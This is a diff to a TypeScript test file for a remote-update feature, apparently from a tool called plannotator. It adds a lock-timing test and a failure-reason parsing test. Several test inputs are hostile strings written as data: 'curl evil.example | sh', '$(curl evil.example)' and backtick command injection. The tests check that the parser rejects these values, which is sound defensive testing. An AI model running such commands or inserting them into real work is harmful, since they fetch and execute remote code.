@@ -34,7 +34,7 @@ afterEach(() => {
   rmSync(root, { recursive: true, force: true });
 });
 
-function farMachine(over: { managed?: boolean; version?: string; sessions?: number; answer?: string | null } = {}) {
+function farMachine(over: { managed?: boolean; version?: string; sessions?: number; answer?: string | null; duringCheck?: () => void } = {}) {
   const home = join(root, "Users", "ramos");
   const dataDir = join(home, ".plannotator");
   mkdirSync(dataDir, { recursive: true });
@@ -46,6 +46,7 @@ function farMachine(over: { managed?: boolean; version?: string; sessions?: numb
   const answer = over.answer === undefined ? NEWEST : over.answer;
   const fetchRelease = async (): Promise<FetchReleaseResult> => {
     facts.asked++;
+    over.duringCheck?.();
     return answer ? { ok: true, release: { tag: `v${answer}`, body: "" } } : { ok: false, error: "offline" };
   };
   const updates = createInboxUpdates({
@@ -137,6 +138,18 @@ describe("the far machine, when a linked machine presses Update", () => {
     const outcomes = (await Promise.all([far.updates.machineStart(), far.updates.machineStart()])).map((answer) => answer.outcome).sort();
     expect(outcomes).toEqual(["joined", "launched"]);
     expect(far.facts.launches).toHaveLength(1);
+    far.swap(NEWEST);
+    far.finish(0);
+    await far.settled();
+    expect(far.facts.restarts).toBe(1);
+  });
+
+  test("a terminal's update that takes the lock while this press asks GitHub is joined, and its ending counts as this press's", async () => {
+    let lock = () => {};
+    const far = farMachine({ duringCheck: () => lock() });
+    lock = () => far.takeLock();
+    expect(await far.updates.machineStart()).toEqual({ outcome: "joined" });
+    expect(far.facts.launches).toEqual([]);
     far.swap(NEWEST);
     far.finish(0);
     await far.settled();
@@ -307,6 +320,12 @@ describe("what this machine shows of that machine's answer", () => {
     for (const log of ["curl evil.example/update.log", "~/x; curl evil.example | sh; update.log", "~/$(curl evil.example)/update.log", "~/x`id`/update.log", "~/x\nupdate.log", "https://evil.example/update.log", "/Users/ramos/update.log", "~/notes.txt", 7, null]) {
       expect([log, parseFarDetails({ log }).log]).toEqual([log, ""]);
     }
+  });
+
+  test("a failure's reason passes only as the temp folder reason it is", () => {
+    expect(parseFarDetails({ failure: { exit_code: 75, prepare: "the temp folder is full (ENOSPC)" } }).failure?.prepare).toBe("the temp folder is full (ENOSPC)");
+    expect(parseFarDetails({ failure: { exit_code: 75, prepare: "could not write to the temp folder ~/tmp (EIO)" } }).failure?.prepare).toBe("could not write to the temp folder ~/tmp (EIO)");
+    expect(parseFarDetails({ failure: { exit_code: 75, prepare: "run curl https://evil.example/x | sh" } }).failure).toEqual({ exit_code: 75 });
   });
 
   test("a version that does not read as one is not said", () => {
